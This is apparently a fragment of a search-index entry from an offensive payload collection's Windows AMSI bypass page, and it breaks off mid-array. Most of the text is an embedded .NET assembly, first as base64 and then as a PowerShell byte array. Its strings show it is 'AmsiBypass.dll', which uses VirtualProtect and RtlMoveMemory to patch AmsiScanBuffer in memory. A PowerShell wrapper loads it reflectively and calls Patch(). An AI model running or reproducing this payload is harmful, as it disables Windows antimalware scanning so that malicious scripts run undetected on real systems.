AAAADUAjQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAENAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAEAIAAAEAMAAwADAAMAAwADQAYgAwAAAANgALAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAABBAG0AcwBpAEIAeQBwAGEAcwBzAAAAAAA+AAsAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAQQBtAHMAaQBCAHkAcABhAHMAcwAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAPgAPAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABBAG0AcwBpAEIAeQBwAGEAcwBzAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABGAA8AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQQBtAHMAaQBCAHkAcABhAHMAcwAuAGQAbABsAAAAAAA2AAsAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEEAbQBzAGkAQgB5AHAAYQBzAHMAAAAAADAABgABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAFw| Out-Null Write-Output \"DLL has been reflected\"; } [Bypass.AMSI]::Patch() }","title":"Amsi Buffer Patch - In memory"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#same-as-6-but-integer-bytes-instead-of-base64","text":"function MyPatch{ if(-not ([System.Management.Automation.PSTypeName]\"Bypass.AMSI\").Type) { [Reflection.Assembly]::Load([byte[]]@(77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0, 184, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 14, 31, 186, 14, 0, 180, 9, 205, 33, 184, 1, 76, 205, 33, 84, 104, 105, 115, 32, 112, 114, 111, 103, 114, 97, 109, 32, 99, 97, 110, 110, 111, 116, 32, 98, 101, 32, 114, 117, 110, 32, 105, 110, 32, 68, 79, 83, 32, 109, 111, 100, 101, 46, 13, 13, 10, 36, 0, 0, 0, 0, 0, 0, 0, 80, 69, 0, 0, 76, 1, 3, 0, 27, 37, 18, 183, 0, 0, 0, 0, 0, 0, 0, 0, 224, 0, 34, 32, 11, 1, 48, 0, 0, 14, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 94, 44, 0, 0, 0, 32, 0, 0, 0, 64, 0, 0, 0, 0, 0, 16, 0, 32, 0, 0, 0, 2, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 3, 0, 64, 133, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 44, 0, 0, 79, 0, 0, 0, 0, 64, 0, 0, 48, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 96, 0, 0, 12, 0, 0, 0, 44, 43, 0, 0, 84, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 32, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 46, 116, 101, 120, 116, 0, 0, 0, 108, 12, 0, 0, 0, 32, 0, 0, 0, 14, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 96, 46, 114, 115, 114, 99, 0, 0, 0, 48, 3, 0, 0, 0, 64, 0, 0, 0, 4, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 64, 46, 114, 101, 108, 111, 99, 0, 0, 12, 0, 0, 0, 0, 96, 0, 0, 0, 2, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 2, 0, 5, 0, 64, 33, 0, 0, 236, 9, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 48, 4, 0, 217, 0, 0, 0, 1, 0, 0, 17, 0, 114, 1, 0, 0, 112, 40, 1, 0, 0, 6, 10, 6, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 6, 17, 6, 44, 20, 0, 114, 19, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 56, 165, 0, 0, 0, 6, 114, 107, 0, 0, 112, 40, 2, 0, 0, 6, 11, 7, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 8, 17, 8, 44, 17, 0, 114, 137, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 119, 26, 106, 40, 15, 0, 0, 10, 12, 22, 13, 7, 8, 31, 64, 18, 3, 40, 3, 0, 0, 6, 22, 254, 1, 19, 9, 17, 9, 44, 17, 0, 114, 255, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 72, 25, 141, 18, 0, 0, 1, 37, 208, 1, 0, 0, 4, 40, 16, 0, 0, 10, 19, 4, 25, 40, 17, 0, 0, 10, 19, 5, 17, 4, 22, 17, 5, 25, 40, 18, 0, 0, 10, 0, 7, 31, 27, 40, 19, 0, 0, 10, 17, 5, 25, 40, 4, 0, 0, 6, 0, 114, 117, 1, 0, 112, 40, 14, 0, 0, 10, 0, 22, 19, 7, 43, 0, 17, 7, 42, 34, 2, 40, 20, 0, 0, 10, 0, 42, 0, 0, 66, 83, 74, 66, 1, 0, 1, 0, 0, 0, 0, 0, 12, 0, 0, 0, 118, 52, 46, 48, 46, 51, 48, 51, 49, 57, 0, 0, 0, 0, 5, 0, 108, 0, 0, 0, 212, 2, 0, 0, 35, 126, 0, 0, 64, 3, 0, 0, 176, 3, 0, 0, 35, 83, 116, 114, 105, 110, 103, 115, 0, 0, 0, 0, 240, 6, 0, 0, 204, 1, 0, 0, 35, 85, 83, 0, 188, 8, 0, 0, 16, 0, 0, 0, 35, 71, 85, 73, 68, 0, 0, 0, 204, 8, 0, 0, 32, 1, 0, 0, 35, 66, 108, 111, 98, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 1, 87, 149, 2, 52, 9, 2, 0, 0, 0, 250, 1, 51, 0, 22, 0, 0, 1, 0, 0, 0, 22, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 10, 0, 0, 0, 20, 0, 0, 0, 11, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 85, 2, 1, 0, 0, 0, 0, 0, 6, 0, 141, 1, 206, 2, 6, 0, 223, 1, 206, 2, 6, 0, 231, 0, 156, 2, 15, 0, 238, 2, 0, 0, 6, 0, 18, 1, 14, 2, 6, 0, 198, 1, 107, 2, 6, 0, 110, 1, 107, 2, 6, 0, 43, 1, 107, 2, 6, 0, 72, 1, 107, 2, 6, 0, 173, 1, 107, 2, 6, 0, 251, 0, 107, 2, 6, 0, 48, 3, 100, 2, 6, 0, 204, 0, 206, 2, 6, 0, 194, 0, 100, 2, 6, 0, 149, 2, 100, 2, 6, 0, 154, 0, 100, 2, 6, 0, 148, 2, 100, 2, 6, 0, 253, 1, 100, 2, 6, 0, 253, 2, 206, 2, 6, 0, 125, 3, 100, 2, 6, 0, 135, 0, 100, 2, 6, 0, 64, 2, 175, 2, 0, 0, 0, 0, 38, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 16, 0, 46, 2, 16, 3, 49, 0, 1, 0, 1, 0, 0, 1, 0, 0, 47, 0, 0, 0, 49, 0, 1, 0, 7, 0, 19, 1, 0, 0, 10, 0, 0, 0, 57, 0, 2, 0, 7, 0, 51, 1, 78, 0, 91, 0, 0, 0, 0, 0, 128, 0, 150, 32, 136, 3, 95, 0, 1, 0, 0, 0, 0, 0, 128, 0, 150, 32, 23, 3, 100, 0, 2, 0, 0, 0, 0, 0, 128, 0, 150, 32, 70, 3, 106, 0, 4, 0, 0, 0, 0, 0, 128, 0, 145, 32, 151, 3, 115, 0, 8, 0, 80, 32, 0, 0, 0, 0, 150, 0, 40, 2, 122, 0, 11, 0, 53, 33, 0, 0, 0, 0, 134, 24, 142, 2, 6, 0, 11, 0, 0, 0, 1, 0, 179, 0, 0, 0, 1, 0, 162, 0, 0, 0, 2, 0, 170, 0, 0, 0, 1, 0, 38, 3, 0, 0, 2, 0, 2, 2, 0, 0, 3, 0, 85, 3, 2, 0, 4, 0, 55, 3, 0, 0, 1, 0, 110, 3, 0, 0, 2, 0, 119, 0, 0, 0, 3, 0, 9, 2, 9, 0, 142, 2, 1, 0, 17, 0, 142, 2, 6, 0, 25, 0, 142, 2, 10, 0, 41, 0, 142, 2, 16, 0, 49, 0, 142, 2, 16, 0, 57, 0, 142, 2, 16, 0, 65, 0, 142, 2, 16, 0, 73, 0, 142, 2, 16, 0, 81, 0, 142, 2, 16, 0, 89, 0, 142, 2, 16, 0, 105, 0, 142, 2, 6, 0, 121, 0, 137, 2, 35, 0, 121, 0, 162, 3, 38, 0, 129, 0, 184, 0, 44, 0, 137, 0, 98, 3, 49, 0, 153, 0, 115, 3, 54, 0, 177, 0, 51, 2, 62, 0, 177, 0, 131, 3, 67, 0, 121, 0, 125, 2, 76, 0, 97, 0, 142, 2, 6, 0, 46, 0, 11, 0, 126, 0, 46, 0, 19, 0, 135, 0, 46, 0, 27, 0, 166, 0, 46, 0, 35, 0, 175, 0, 46, 0, 43, 0, 230, 0, 46, 0, 51, 0, 246, 0, 46, 0, 59, 0, 1, 1, 46, 0, 67, 0, 14, 1, 46, 0, 75, 0, 230, 0, 46, 0, 83, 0, 230, 0, 99, 0, 91, 0, 25, 1, 1, 0, 3, 0, 0, 0, 4, 0, 21, 0, 1, 0, 72, 2, 0, 1, 3, 0, 136, 3, 1, 0, 0, 1, 5, 0, 23, 3, 1, 0, 0, 1, 7, 0, 70, 3, 1, 0, 0, 1, 9, 0, 148, 3, 2, 0, 100, 44, 0, 0, 1, 0, 4, 128, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 12, 3, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 0, 123, 0, 0, 0, 0, 0, 4, 0, 3, 0, 0, 0, 0, 0, 0, 107, 101, 114, 110, 101, 108, 51, 50, 0, 95, 95, 83, 116, 97, 116, 105, 99, 65, 114, 114, 97, 121, 73, 110, 105, 116, 84, 121, 112, 101, 83, 105, 122, 101, 61, 51, 0, 60, 77, 111, 100, 117, 108, 101, 62, 0, 60, 80, 114, 105, 118, 97, 116, 101, 73, 109, 112, 108, 101, 109, 101, 110, 116, 97, 116, 105, 111, 110, 68, 101, 116, 97, 105, 108, 115, 62, 0, 53, 49, 67, 65, 70, 66, 52, 56, 49, 51, 57, 66, 48, 50, 69, 48, 54, 49, 68, 52, 57, 49, 57, 67, 53, 49, 55, 54, 54, 50, 49, 66, 70, 56, 55, 68, 65, 67, 69, 68, 0, 115, 114, 99, 0, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 0, 82, 117, 110, 116, 105, 109, 101, 70, 105, 101, 108, 100, 72, 97, 110, 100, 108, 101, 0, 67, 111, 110, 115, 111, 108, 101, 0, 104, 77, 111, 100, 117, 108, 101, 0, 112, 114, 111, 99, 78, 97, 109, 101, 0, 110, 97, 109, 101, 0, 87, 114, 105, 116, 101, 76, 105, 110, 101, 0, 86, 97, 108, 117, 101, 84, 121, 112, 101, 0, 67, 111, 109, 112, 105, 108, 101, 114, 71, 101, 110, 101, 114, 97, 116, 101, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 68, 101, 98, 117, 103, 103, 97, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 105, 116, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 84, 97, 114, 103, 101, 116, 70, 114, 97, 109, 101, 119, 111, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 70, 105, 108, 101, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 97, 108, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 112, 105, 108, 97, 116, 105, 111, 110, 82, 101, 108, 97, 120, 97, 116, 105, 111, 110, 115, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 80, 114, 111, 100, 117, 99, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 109, 112, 97, 110, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 82, 117, 110, 116, 105, 109, 101, 67, 111, 109, 112, 97, 116, 105, 98, 105, 108, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 66, 121, 116, 101, 0, 100, 119, 83, 105, 122, 101, 0, 115, 105, 122, 101, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 86, 101, 114, 115, 105, 111, 110, 105, 110, 103, 0, 80, 97, 116, 99, 104, 0, 65, 109, 115, 105, 0, 65, 108, 108, 111, 99, 72, 71, 108, 111, 98, 97, 108, 0, 77, 97, 114, 115, 104, 97, 108, 0, 107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 100, 108, 108, 0, 83, 121, 115, 116, 101, 109, 0, 83, 121, 115, 116, 101, 109, 46, 82, 101, 102, 108, 101, 99, 116, 105, 111, 110, 0, 111, 112, 95, 65, 100, 100, 105, 116, 105, 111, 110, 0, 90, 101, 114, 111, 0, 46, 99, 116, 111, 114, 0, 85, 73, 110, 116, 80, 116, 114, 0, 83, 121, 115, 116, 101, 109, 46, 68, 105, 97, 103, 110, 111, 115, 116, 105, 99, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 73, 110, 116, 101, 114, 111, 112, 83, 101, 114, 118, 105, 99, 101, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 67, 111, 109, 112, 105, 108, 101, 114, 83, 101, 114, 118, 105, 99, 101, 115, 0, 68, 101, 98, 117, 103, 103, 105, 110, 103, 77, 111, 100, 101, 115, 0, 82, 117, 110, 116, 105, 109, 101, 72, 101, 108, 112, 101, 114, 115, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0, 108, 112, 65, 100, 100, 114, 101, 115, 115, 0, 79, 98, 106, 101, 99, 116, 0, 108, 112, 102, 108, 79, 108, 100, 80, 114, 111, 116, 101, 99, 116, 0, 86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0, 102, 108, 78, 101, 119, 80, 114, 111, 116, 101, 99, 116, 0, 111, 112, 95, 69, 120, 112, 108, 105, 99, 105, 116, 0, 100, 101, 115, 116, 0, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101, 65, 114, 114, 97, 121, 0, 67, 111, 112, 121, 0, 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 0, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 0, 111, 112, 95, 69, 113, 117, 97, 108, 105, 116, 121, 0, 0, 0, 0, 17, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 87, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 29, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 102, 0, 117, 0, 110, 0, 99, 0, 116, 0, 105, 0, 111, 0, 110, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 109, 0, 111, 0, 100, 0, 105, 0, 102, 0, 121, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 109, 0, 101, 0, 109, 0, 111, 0, 114, 0, 121, 0, 32, 0, 112, 0, 101, 0, 114, 0, 109, 0, 105, 0, 115, 0, 115, 0, 105, 0, 111, 0, 110, 0, 115, 0, 33, 0, 0, 83, 71, 0, 114, 0, 101, 0, 97, 0, 116, 0, 32, 0, 115, 0, 117, 0, 99, 0, 99, 0, 101, 0, 115, 0, 115, 0, 46, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 112, 0, 97, 0, 116, 0, 99, 0, 104, 0, 101, 0, 100, 0, 33, 0, 32, 0, 58, 0, 41, 0, 0, 0, 0, 0, 94, 196, 134, 67, 207, 43, 76, 71, 180, 110, 209, 17, 221, 107, 164, 138, 0, 4, 32, 1, 1, 8, 3, 32, 0, 1, 5, 32, 1, 1, 17, 17, 4, 32, 1, 1, 14, 13, 7, 10, 24, 24, 25, 9, 29, 5, 24, 2, 8, 2, 2, 2, 6, 24, 5, 0, 2, 2, 24, 24, 4, 0, 1, 1, 14, 4, 0, 1, 25, 11, 7, 0, 2, 1, 18, 81, 17, 85, 4, 0, 1, 24, 8, 8, 0, 4, 1, 29, 5, 8, 24, 8, 5, 0, 2, 24, 24, 8, 8, 204, 123, 19, 255, 205, 45, 221, 81, 3, 6, 17, 16, 4, 0, 1, 24, 14, 5, 0, 2, 24, 24, 14, 8, 0, 4, 2, 24, 25, 9, 16, 9, 6, 0, 3, 1, 24, 24, 8, 3, 0, 0, 8, 8, 1, 0, 8, 0, 0, 0, 0, 0, 30, 1, 0, 1, 0, 84, 2, 22, 87, 114, 97, 112, 78, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 84, 104, 114, 111, 119, 115, 1, 8, 1, 0, 7, 1, 0, 0, 0, 0, 54, 1, 0, 25, 46, 78, 69, 84, 83, 116, 97, 110, 100, 97, 114, 100, 44, 86, 101, 114, 115, 105, 111, 110, 61, 118, 50, 46, 48, 1, 0, 84, 14, 20, 70, 114, 97, 109, 101, 119, 111, 114, 107, 68, 105, 115, 112, 108, 97, 121, 78, 97, 109, 101, 0, 15, 1, 0, 10, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 0, 10, 1, 0, 5, 68, 101, 98, 117, 103, 0, 0, 12, 1, 0, 7, 49, 46, 48, 46, 48, 46, 48, 0, 0, 10, 1, 0, 5, 49, 46, 48, 46, 48, 0, 0, 4, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 92, 168, 168, 0, 1, 77, 80, 2, 0, 0, 0, 100, 0, 0, 0, 128, 43, 0, 0, 128, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 19, 0, 0, 0, 39, 0, 0, 0, 228, 43, 0, 0, 228, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 83, 68, 83, 215, 18, 206, 3, 139, 112, 185, 73, 189, 89, 99, 32, 233, 159, 0, 221, 1, 0, 0, 0, 47, 111, 112, 116, 47, 80, 114, 111, 106, 101, 99, 116, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 111, 98, 106, 47, 68, 101, 98, 117, 103, 47, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 50, 46, 48, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 112, 100, 98, 0, 83, 72, 65, 50, 53, 54, 0, 215, 18, 206, 3, 139, 112, 185, 169, 125, 89, 99, 32, 233, 159, 0, 221, 32, 92, 168, 40, 54, 252, 229, 155, 150, 128, 72, 101, 126, 213, 146, 143, 51, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 77, 44, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 95, 67, 111, 114, 68, 108, 108, 77, 97, 105, 110, 0, 109, 115, 99, 111, 114, 101, 101, 46, 100, 108, 108, 0, 0, 0, 0, 0, 0, 255, 37, 0, 32, 0, 16, 49, 255, 144, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 16, 0, 0, 0, 24, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 48, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 72, 0, 0, 0, 88, 64, 0, 0, 212, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 212, 2, 52, 0, 0, 0, 86, 0, 83, 0, 95, 0, 86, 0, 69, 0, 82, 0, 83, 0, 73, 0, 79, 0, 78, 0, 95, 0, 73, 0, 78, 0, 70, 0, 79, 0, 0, 0, 0, 0, 189, 4, 239, 254, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 63, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 0, 0, 0, 1, 0, 86, 0, 97, 0, 114, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 0, 0, 36, 0, 4, 0, 0, 0, 84, 0, 114, 0, 97, 0, 110, 0, 115, 0, 108, 0, 97, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 0, 0, 176, 4, 52, 2, 0, 0, 1, 0, 83, 0, 116, 0, 114, 0, 105, 0, 110, 0, 103, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 16, 2, 0, 0, 1, 0, 48, 0, 48, 0, 48, 0, 48, 0, 48, 0, 52, 0, 98, 0, 48, 0, 0, 0, 54, 0, 11, 0, 1, 0, 67, 0, 111, 0, 109, 0, 112, 0, 97, 0, 110, 0, 121, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 62, 0, 11, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 68, 0, 101, 0, 115, 0, 99, 0, 114, 0, 105, 0, 112, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 8, 0, 